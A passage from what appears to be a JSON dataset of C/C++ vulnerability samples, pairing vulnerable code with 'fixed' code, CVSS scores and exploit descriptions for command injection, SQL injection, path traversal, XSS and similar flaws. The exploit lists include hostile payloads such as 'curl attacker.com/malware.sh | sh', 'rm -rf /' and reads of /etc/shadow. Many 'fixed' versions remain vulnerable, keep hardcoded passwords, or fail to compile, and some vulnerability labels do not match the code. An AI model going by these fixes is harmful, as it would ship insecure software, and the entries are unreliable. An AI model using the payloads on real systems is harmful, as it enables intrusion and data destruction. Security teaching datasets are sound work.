        "vulnerability_code": "#include <stdio.h>\\n#include <string.h>\\nclass VulnerableClass {\\npublic:\\n    void unsafeFunction(char* input) {\\n        char buffer[10];\\n        strcpy(buffer, input);\\n    }\\n};",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\\n#include <string.h>\\nclass SecureClass {\\npublic:\\n    void safeFunction(const char* input) {\\n        char buffer[10];\\n        strncpy(buffer, input, sizeof(buffer) - 1);\\n        buffer[sizeof(buffer) - 1] = '\\0';\\n    }\\n};",
        "exploit_ways": [
            "An attacker can provide a string longer than 10 characters to overwrite adjacent memory.",
            "Can use crafted input to corrupt the stack and execute arbitrary code.",
            "Could potentially alter program flow by overwriting return addresses on the stack."
        ]
    },
    "c_11": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    char command[256];\n    printf(\"Enter command to execute: \");\n    fgets(command, sizeof(command), stdin);\n    system(command);\n    return 0;\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nint main() {\n    char command[256];\n    printf(\"Enter command to execute: \");\n    fgets(command, sizeof(command), stdin);\n    command[strcspn(command, \"\\n\")] = 0;\n    if (strcmp(command, \"allowed_command\") == 0) {\n        system(command);\n    } else {\n        printf(\"Command not allowed\\n\");\n    }\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'ls -la' to list all files in the directory.",
            "Could use 'whoami' to find out the current user running the program.",
            "Could chain commands like 'echo Hello; rm *' to delete files."
        ]
    },
    "c_12": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\nvoid process_data(const char *data) {\n    FILE *fp;\n    fp = popen(data, \"r\");\n    if (fp == NULL) {\n        printf(\"Failed to run command\\n\" );\n        exit(1);\n    }\n    pclose(fp);\n}",
        "cvss_score": 7.8,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid process_data(const char *data) {\n    const char *allowed_commands[] = {\"ls\", \"whoami\", NULL};\n    int is_allowed = 0;\n    for (int i = 0; allowed_commands[i] != NULL; i++) {\n        if (strcmp(data, allowed_commands[i]) == 0) {\n            is_allowed = 1;\n            break;\n        }\n    }\n    if (!is_allowed) {\n        printf(\"Command not allowed\\n\");\n        return;\n    }\n    FILE *fp;\n    fp = popen(data, \"r\");\n    if (fp == NULL) {\n        printf(\"Failed to run command\\n\" );\n        exit(1);\n    }\n    pclose(fp);\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c_13": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nint authenticate(char *username, char *password) {\n    if (strcmp(username, \"admin\") == 0 && strcmp(password, \"secret\") == 0) {\n        return 1;\n    }\n    return 0;\n}\n\nint main() {\n    char username[256], password[256];\n    printf(\"Enter username: \");\n    scanf(\"%s\", username);\n    printf(\"Enter password: \");\n    scanf(\"%s\", password);\n    if (authenticate(username, password)) {\n        printf(\"Access granted.\\n\");\n    } else {\n        printf(\"Access denied.\\n\");\n    }\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint authenticate(const char *username, const char *password) {\n    if (strcmp(username, \"admin\") == 0 && strcmp(password, getenv(\"ADMIN_PASSWORD\")) == 0) {\n        return 1;\n    }\n    return 0;\n}\n\nint main() {\n    char username[256], password[256];\n    printf(\"Enter username: \");\n    fgets(username, sizeof(username), stdin);\n    username[strcspn(username, \"\\n\")] = 0;\n    printf(\"Enter password: \");\n    fgets(password, sizeof(password), stdin);\n    password[strcspn(password, \"\\n\")] = 0;\n    if (authenticate(username, password)) {\n        printf(\"Access granted.\\n\");\n    } else {\n        printf(\"Access denied.\\n\");\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can guess the default username 'admin' and try common passwords.",
            "Using brute force to try multiple combinations of usernames and passwords.",
            "Exploiting predictable or weak password policies to gain unauthorized access."
        ]
    },
    "c_14": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid print_message(char *name) {\n    printf(\"Hello, %s!\\n\", name);\n}\n\nint main() {\n    char user_input[100];\n    printf(\"Enter your name: \");\n    scanf(\"%99s\", user_input);\n    print_message(user_input);\n    return 0;\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid escape_html(char *str, char *escaped_str) {\n    while (*str) {\n        switch(*str) {\n            case '<': strcat(escaped_str, \"&lt;\"); break;\n            case '>': strcat(escaped_str, \"&gt;\"); break;\n            case '&': strcat(escaped_str, \"&amp;\"); break;\n            case '\"': strcat(escaped_str, \"&quot;\"); break;\n            default: strncat(escaped_str, str, 1);\n        }\n        str++;\n    }\n}\n\nvoid print_message(char *name) {\n    char escaped_name[200];\n    escape_html(name, escaped_name);\n    printf(\"Hello, %s!\\n\", escaped_name);\n}\n\nint main() {\n    char user_input[100];\n    printf(\"Enter your name: \");\n    scanf(\"%99s\", user_input);\n    print_message(user_input);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could input a script tag like <script>alert('XSS')</script> to execute JavaScript in the context of the application.",
            "Inputting <img src=x onerror=alert(1)> can trigger an alert without needing to close tags, potentially bypassing naive filters.",
            "Using <svg/onload=prompt(document.cookie)> could be used to steal cookies or perform other malicious actions."
        ]
    },
    "c_15": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\nvoid read_file(char *filename) {\n    char path[100];\n    snprintf(path, sizeof(path), \"/var/log/%s.log\", filename);\n    FILE *file = fopen(path, \"r\");\n    if (file) {\n        char buffer[256];\n        while (fgets(buffer, sizeof(buffer), file)) {\n            printf(\"%s\", buffer);\n        }\n        fclose(file);\n    } else {\n        perror(\"Failed to open file\");\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid read_file(char *filename) {\n    char path[100];\n    if (strchr(filename, '/') != NULL || strchr(filename, '\\\\') != NULL) {\n        fprintf(stderr, \"Invalid filename\\n\");\n        return;\n    }\n    snprintf(path, sizeof(path), \"/var/log/%s.log\", filename);\n    FILE *file = fopen(path, \"r\");\n    if (file) {\n        char buffer[256];\n        while (fgets(buffer, sizeof(buffer), file)) {\n            printf(\"%s\", buffer);\n        }\n        fclose(file);\n    } else {\n        perror(\"Failed to open file\");\n    }\n}",
        "exploit_ways": [
            "An attacker can input \"../etc/passwd\" to read the system's password file.",
            "They can use \"../../shadow\" to attempt to access hashed passwords, if permissions allow.",
            "Input like \"..%2F..%2F..%2Fetc%2Fpasswd\" using URL encoding may also bypass simple checks."
        ]
    },
    "c_16": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid execute_command(char* cmd) {\n    char buffer[128];\n    snprintf(buffer, sizeof(buffer), \"echo %s\", cmd);\n    system(buffer);\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid execute_command(char* cmd) {\n    char buffer[128];\n    if (snprintf(buffer, sizeof(buffer), \"echo %s\", cmd) >= sizeof(buffer)) {\n        fprintf(stderr, \"Command too long\\n\");\n        return;\n    }\n    system(buffer);\n}",
        "exploit_ways": [
            "An attacker can input \"; rm -rf /\" to delete all files.",
            "They could use \"; curl http://attacker.com/malicious.sh | sh\" to download and execute a script from a remote server.",
            "The command \"; cat /etc/passwd\" can be used to leak the system's user database."
        ]
    },
    "c_17": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid run_command() {\n    char cmd[100];\n    printf(\"Enter command: \");\n    gets(cmd);\n    system(cmd);\n}\n\nint main() {\n    run_command();\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid run_command() {\n    char cmd[100];\n    printf(\"Enter command: \");\n    if (fgets(cmd, sizeof(cmd), stdin) != NULL) {\n        // Remove newline character if present\n        size_t len = strlen(cmd);\n        if (len > 0 && cmd[len - 1] == '\\n') {\n            cmd[len - 1] = '\\0';\n        }\n        // Only allow specific commands\n        if (strcmp(cmd, \"ls\") == 0 || strcmp(cmd, \"whoami\") == 0) {\n            system(cmd);\n        } else {\n            printf(\"Command not allowed\\n\");\n        }\n    }\n}\n\nint main() {\n    run_command();\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'sudo -i' to gain root privileges.",
            "Could use 'id; rm /etc/passwd' to delete critical system files.",
            "Could chain commands like 'pwd; cat /etc/shadow' to leak sensitive information."
        ]
    },
    "c_18": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nint authenticate(char *username, char *password) {\n    if (strcmp(username, \"admin\") == 0 && strcmp(password, \"123456\") == 0) {\n        return 1;\n    }\n    return 0;\n}\n\nint main() {\n    char username[20], password[20];\n    printf(\"Enter username: \");\n    scanf(\"%s\", username);\n    printf(\"Enter password: \");\n    scanf(\"%s\", password);\n    if (authenticate(username, password)) {\n        printf(\"Login successful!\\n\");\n    } else {\n        printf(\"Login failed.\\n\");\n    }\n    return 0;\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <stdbool.h>\n\nbool authenticate(const char *username, const char *password) {\n    const char *correct_username = \"admin\";\n    const char *correct_password = \"123456\";\n    return strcmp(username, correct_username) == 0 && strcmp(password, correct_password) == 0;\n}\n\nint main() {\n    char username[20], password[20];\n    printf(\"Enter username: \");\n    if (fgets(username, sizeof(username), stdin)) {\n        size_t len = strlen(username);\n        if (len > 0 && username[len - 1] == '\\n') {\n            username[len - 1] = '\\0';\n        }\n    }\n    printf(\"Enter password: \");\n    if (fgets(password, sizeof(password), stdin)) {\n        size_t len = strlen(password);\n        if (len > 0 && password[len - 1] == '\\n') {\n            password[len - 1] = '\\0';\n        }\n    }\n    if (authenticate(username, password)) {\n        printf(\"Login successful!\\n\");\n    } else {\n        printf(\"Login failed.\\n\");\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can guess the default username 'admin' and try common passwords like '123456'.",
            "Brute force attacks could be used to attempt many different password combinations.",
            "Using a dictionary attack, an attacker might use a list of commonly used usernames and passwords."
        ]
    },
    "c_19": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid handle_request(const char *request) {\n    if (strstr(request, \"action=transfer\") != NULL) {\n        printf(\"Transferring funds...\\n\");\n        // Vulnerable code to CSRF\n    }\n}\n\nint main() {\n    const char *malicious_request = \"GET /?action=transfer HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\";\n    handle_request(malicious_request);\n    return 0;\n}",
        "cvss_score": 6.8,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid handle_request(const char *request) {\n    const char *token = \"secure_token_123\";\n    if (strstr(request, \"action=transfer\") != NULL && strstr(request, token) != NULL) {\n        printf(\"Transferring funds...\\n\");\n        // Secure code\n    }\n}\n\nint main() {\n    const char *malicious_request = \"GET /?action=transfer&token=secure_token_123 HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\";\n    handle_request(malicious_request);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could create a malicious link to trick the victim into performing unauthorized actions.",
            "By injecting the request into a CSRF attack vector, attackers can transfer funds without user consent.",
            "Using social engineering tactics, an attacker could convince a user to click on a crafted URL, triggering a fund transfer."
        ]
    },
    "c_20": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nclass DatabaseQuery {\nprivate:\n    char query[100];\npublic:\n    void setQuery(const char* userInput) {\n        strcpy(query, \"SELECT * FROM users WHERE username = '\");\n        strcat(query, userInput);\n        strcat(query, \"';\");\n    }\n\n    void execute() {\n        printf(\"Executing query: %s\\n\", query);\n        // Simulate database execution\n    }\n};",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nclass DatabaseQuery {\nprivate:\n    char query[100];\npublic:\n    void setQuery(const char* userInput) {\n        snprintf(query, sizeof(query), \"SELECT * FROM users WHERE username = '%s';\", userInput);\n        // Use parameterized queries or proper escaping in real applications\n    }\n\n    void execute() {\n        printf(\"Executing query: %s\\n\", query);\n        // Simulate database execution\n    }\n};",
        "exploit_ways": [
            "An attacker can input \"admin' OR '1'='1\" to bypass authentication.",
            "They can use \"admin'; DROP TABLE users; --\" to delete the users table.",
            "Input like \"admin'; UNION SELECT password FROM users; --\" can extract passwords."
        ]
    },
    "c_21": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid execute_command(const char* command) {\n    char buffer[128];\n    snprintf(buffer, sizeof(buffer), \"ls -l %s\", command);\n    system(buffer);\n}\n\nint main() {\n    char user_input[32];\n    printf(\"Enter directory to list: \");\n    fgets(user_input, sizeof(user_input), stdin);\n    execute_command(user_input);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid execute_command(const char* command) {\n    system(command);\n}\n\nint main() {\n    char user_input[32];\n    printf(\"Enter directory to list: \");\n    fgets(user_input, sizeof(user_input), stdin);\n    // Remove newline character if present\n    size_t len = strlen(user_input);\n    if (len > 0 && user_input[len - 1] == '\\n') {\n        user_input[len - 1] = '\\0';\n    }\n    char buffer[128];\n    snprintf(buffer, sizeof(buffer), \"ls -l %s\", user_input);\n    execute_command(buffer);\n    return 0;\n}",
        "exploit_ways": [
            "User could input \"; rm -rf /\" to delete system files.",
            "Could use \"; wget http://attacker.com/malware.sh; sh malware.sh\" to download and run malicious script.",
            "Could chain commands like \"; cat /etc/passwd > /tmp/output\" to leak sensitive files."
        ]
    },
    "c_22": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\nclass SystemExecutor {\npublic:\n    void executeCommand(const char* cmd) {\n        system(cmd);\n    }\n};",
        "cvss_score": 7.2,
        "fixed_code": "#include <iostream>\n#include <string>\n#include <vector>\n#include <algorithm>\nclass SystemExecutor {\npublic:\n    void executeCommand(const char* cmd) {\n        std::vector<std::string> allowedCommands = {\"ls\", \"whoami\"};\n        std::string command(cmd);\n        if (std::find(allowedCommands.begin(), allowedCommands.end(), command) != allowedCommands.end()) {\n            system(command.c_str());\n        } else {\n            std::cout << \"Command not allowed.\" << std::endl;\n        }\n    }\n};",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c_23": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s filename\\n\", argv[0]);\n        return 1;\n    }\n\n    char buffer[512];\n    snprintf(buffer, sizeof(buffer), \"/safe_dir/%s\", argv[1]);\n\n    FILE *file = fopen(buffer, \"r\");\n    if (file == NULL) {\n        perror(\"Failed to open file\");\n        return 1;\n    }\n\n    char line[256];\n    while (fgets(line, sizeof(line), file)) {\n        printf(\"%s\", line);\n    }\n\n    fclose(file);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s filename\\n\", argv[0]);\n        return 1;\n    }\n\n    const char *base_dir = \"/safe_dir/\";\n    size_t base_len = strlen(base_dir);\n    size_t file_len = strlen(argv[1]);\n\n    if (file_len > 512 - base_len) {\n        printf(\"Filename too long\\n\");\n        return 1;\n    }\n\n    char buffer[512];\n    snprintf(buffer, sizeof(buffer), \"%s%s\", base_dir, argv[1]);\n\n    // Check for directory traversal attempts\n    if (strstr(buffer + base_len, \"../\") != NULL) {\n        printf(\"Invalid filename\\n\");\n        return 1;\n    }\n\n    FILE *file = fopen(buffer, \"r\");\n    if (file == NULL) {\n        perror(\"Failed to open file\");\n        return 1;\n    }\n\n    char line[256];\n    while (fgets(line, sizeof(line), file)) {\n        printf(\"%s\", line);\n    }\n\n    fclose(file);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can provide a filename like \"../../etc/passwd\" to read the system's password file.",
            "Using \"../secret_data/file.txt\" could lead to reading sensitive files outside of /safe_dir/.",
            "Crafting filenames with null bytes or other special characters might bypass simple checks."
        ]
    },
    "c_24": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid insecure_deserialize(const char *data) {\n    system(data);\n}\n\nint main() {\n    const char *payload = \"rm -rf /\";\n    insecure_deserialize(payload);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid secure_function(const char *data) {\n    // Define a list of allowed commands\n    const char* allowed_commands[] = {\"ls\", \"whoami\", NULL};\n    int is_allowed = 0;\n    for (int i = 0; allowed_commands[i] != NULL; i++) {\n        if (strcmp(data, allowed_commands[i]) == 0) {\n            is_allowed = 1;\n            break;\n        }\n    }\n    if (is_allowed) {\n        system(data);\n    } else {\n        printf(\"Command not allowed\\n\");\n    }\n}\n\nint main() {\n    const char *payload = \"rm -rf /\";\n    secure_function(payload);\n    return 0;\n}",
        "exploit_ways": [
            "Attacker could input 'rm -rf /' to delete all files on the system.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "c_25": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid log_message(char *message) {\n    char buffer[1024];\n    snprintf(buffer, sizeof(buffer), \"Logging message: %s\\n\", message);\n    printf(\"%s\", buffer);\n}\n\nint main() {\n    char user_input[512];\n    fgets(user_input, sizeof(user_input), stdin);\n    log_message(user_input);\n    return 0;\n}",
        "cvss_score": 3.3,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid log_message(char *message) {\n    char buffer[1024];\n    snprintf(buffer, sizeof(buffer), \"Logging message: %s\\n\", message);\n    printf(\"%s\", buffer);\n}\n\nint main() {\n    char user_input[512];\n    if (fgets(user_input, sizeof(user_input), stdin) != NULL) {\n        // Remove newline character from input if present\n        size_t len = strlen(user_input);\n        if (len > 0 && user_input[len - 1] == '\\n') {\n            user_input[len - 1] = '\\0';\n        }\n        log_message(user_input);\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could input a very long string to cause buffer overflow, potentially leading to code execution.",
            "Sensitive information could be logged by providing malicious inputs that contain sensitive data like passwords or keys.",
            "By entering specific patterns in the input, an attacker might exploit other parts of the system that consume the log output."
        ]
    },
    "c_26": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\\n#include <string.h>\\n\\nvoid display_message() {\\n    char message[50];\\n    strcpy(message, \"This is a sensitive message.\");\\n    printf(\"Message: %s\\n\", message);\\n}\\n\\nint main() {\\n    display_message();\\n    return 0;\\n}",
        "cvss_score": 2.1,
        "fixed_code": "#include <stdio.h>\\n#include <string.h>\\n\\nvoid display_message() {\\n    char message[50];\\n    strcpy(message, \"This is a public message.\");\\n    printf(\"Message: %s\\n\", message);\\n}\\n\\nint main() {\\n    display_message();\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker could use a debugger to inspect the memory and read the sensitive message.",
            "If compiled with insecure compiler flags, the binary might contain debug information revealing the message.",
            "In a multi-user environment, another user might be able to intercept terminal output to see the message."
        ]
    },
    "c_27": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define MAX_URL 256\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s <url>\\n\", argv[0]);\n        return 1;\n    }\n\n    char url[MAX_URL];\n    strncpy(url, argv[1], MAX_URL - 1);\n    url[MAX_URL - 1] = '\\0'; // Ensure null termination\n\n    printf(\"Redirecting to %s\\n\", url);\n    system(url); // Vulnerable command execution\n\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define MAX_URL 256\n\ndefine ALLOWED_HOST \"example.com\"\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s <url>\\n\", argv[0]);\n        return 1;\n    }\n\n    char url[MAX_URL];\n    strncpy(url, argv[1], MAX_URL - 1);\n    url[MAX_URL - 1] = '\\0'; // Ensure null termination\n\n    // Check if the URL starts with the allowed host\n    if (strstr(url, ALLOWED_HOST) != url) {\n        printf(\"URL is not allowed.\\n\");\n        return 1;\n    }\n\n    printf(\"Redirecting to %s\\n\", url);\n    // Use execl for safer command execution\n    execl(\"/bin/sh\", \"sh\", \"-c\", \"xdg-open \\\"\", url, \"\\\"\", (char *)NULL);\n\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could input a malicious URL like 'http://malicious.com' to redirect users to an untrusted site.",
            "By injecting '; rm -rf /', the attacker might attempt to execute arbitrary commands, leading to system damage.",
            "Using URL encoding, an attacker can obfuscate the payload, making it harder to detect and exploit vulnerabilities in the URL handling."
        ]
    },
    "c_28": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid serve_page() {\n    char response[1024];\n    strcpy(response, \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body><h1>Hello World</h1></body></html>\");\n    printf(\"%s\", response);\n}\n\nint main() {\n    serve_page();\n    return 0;\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid serve_page() {\n    char response[1024];\n    strcpy(response, \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nX-XSS-Protection: 1; mode=block\\r\\nX-Content-Type-Options: nosniff\\r\\nStrict-Transport-Security: max-age=31536000\\r\\n\\r\\n<html><body><h1>Hello World</h1></body></html>\");\n    printf(\"%s\", response);\n}\n\nint main() {\n    serve_page();\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the page to steal cookies or perform XSS attacks.",
            "Lack of X-Content-Type-Options allows MIME type sniffing, leading to potential code execution vulnerabilities.",
            "Without HSTS header, attackers can perform man-in-the-middle attacks by forcing connections over HTTP."
        ]
    },
    "c_29": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_response(const char* data) {\n    printf(\"Content-Type: text/html\\r\\n\");\n    printf(\"Content-Length: %zu\\r\\n\", strlen(data));\n    printf(\"\\r\\n%s\", data);\n}",
        "cvss_score": 5.0,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_response(const char* data) {\n    printf(\"Content-Type: text/html\\r\\n\");\n    printf(\"Content-Length: %zu\\r\\n\", strlen(data));\n    printf(\"X-XSS-Protection: 1; mode=block\\r\\n\");\n    printf(\"X-Content-Type-Options: nosniff\\r\\n\");\n    printf(\"X-Frame-Options: SAMEORIGIN\\r\\n\");\n    printf(\"Strict-Transport-Security: max-age=31536000; includeSubDomains\\r\\n\");\n    printf(\"\\r\\n%s\", data);\n}",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the response if not properly sanitized, leading to XSS.",
            "Without Content-Type-Options: nosniff, browsers may interpret files as different MIME types than intended, leading to potential attacks.",
            "Lack of X-Frame-Options makes the application vulnerable to clickjacking attacks where it can be embedded in another site's frame."
        ]
    },
    "c_30": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        fprintf(stderr, \"Usage: %s <url>\\n\", argv[0]);\n        return 1;\n    }\n    \n    char command[256];\n    snprintf(command, sizeof(command), \"curl -o /dev/null -s -w \\\"%%{http_code}\\\" %s\", argv[1]);\n    int http_status = system(command);\n    \n    printf(\"HTTP Status: %d\\n\", WEXITSTATUS(http_status));\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <curl/curl.h>\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        fprintf(stderr, \"Usage: %s <url>\\n\", argv[0]);\n        return 1;\n    }\n    \n    CURL *curl;\n    CURLcode res;\n    long http_status_code;\n    \n    curl = curl_easy_init();\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, argv[1]);\n        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);\n        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);\n        res = curl_easy_perform(curl);\n        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_status_code);\n        curl_easy_cleanup(curl);\n    }\n    \n    printf(\"HTTP Status: %ld\\n\", http_status_code);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can provide a URL pointing to an internal resource within the same network.",
            "They could use a crafted URL with CRLF injection to manipulate headers and access unauthorized data.",
            "Input like 'file:///etc/passwd' can be used to read local files on the server."
        ]
    },
    "c_31": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\ntypedef struct {\n    char sessionId[50];\n} UserSession;\n\nvoid createSession(UserSession *session, const char *id) {\n    strcpy(session->sessionId, id);\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\ntypedef struct {\n    char sessionId[50];\n} UserSession;\n\nvoid createSession(UserSession *session) {\n    snprintf(session->sessionId, sizeof(session->sessionId), \"%lu\", (unsigned long)rand());\n}",
        "exploit_ways": [
            "An attacker can predict or guess the session ID to hijack a user's session.",
            "By maintaining the same session ID across multiple sessions, an attacker could exploit session fixation vulnerabilities in applications that do not regenerate IDs.",
            "If the vulnerable application uses predictable session IDs, attackers can manually set their session cookie to match a valid user's session."
        ]
    },
    "c_32": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_http_response(const char* user_input) {\n    char response[1024];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", user_input);\n    printf(\"%s\", response);\n}\n\nint main() {\n    char input[512];\n    printf(\"Enter your data: \");\n    fgets(input, sizeof(input), stdin);\n    send_http_response(input);\n    return 0;\n}",
        "cvss_score": 6.8,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid sanitize_input(char* input) {\n    for (int i = 0; input[i] != '\\0'; i++) {\n        if (input[i] == '\\r' || input[i] == '\\n') {\n            input[i] = ' ';\n        }\n    }\n}\n\nvoid send_http_response(const char* user_input) {\n    char sanitized_input[512];\n    strncpy(sanitized_input, user_input, sizeof(sanitized_input));\n    sanitize_input(sanitized_input);\n    char response[1024];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", sanitized_input);\n    printf(\"%s\", response);\n}\n\nint main() {\n    char input[512];\n    printf(\"Enter your data: \");\n    fgets(input, sizeof(input), stdin);\n    send_http_response(input);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject \\r\\nSet-Cookie: MaliciousCookie=1; to set a malicious cookie.",
            "They could use \\r\\nHTTP/1.1 302 Moved Temporarily\\r\\nLocation: http://malicious.com to redirect users to a malicious site.",
            "An attacker might inject multiple headers using \\r\\n to manipulate server responses."
        ]
    },
    "c_33": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid sendResponse(char *userInput) {\n    printf(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\\n\", userInput);\n}",
        "cvss_score": 4.3,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid sendResponse(char *userInput) {\n    char safeInput[1024];\n    strncpy(safeInput, userInput, sizeof(safeInput)-1);\n    safeInput[sizeof(safeInput)-1] = '\\0';\n    for (int i = 0; safeInput[i] != '\\0'; i++) {\n        if (safeInput[i] == '\\r' || safeInput[i] == '\\n') {\n            safeInput[i] = ' ';\n        }\n    }\n    printf(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\\n\", safeInput);\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: session=malicious' to manipulate cookies.",
            "Could use '\\r\\nLocation: http://attacker.com' to perform open redirection attacks.",
            "Injecting '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n<html><body>Malicious Content</body></html>' could display arbitrary content."
        ]
    },
    "c_34": {
        "vulnerability_type": "Open Redirect",
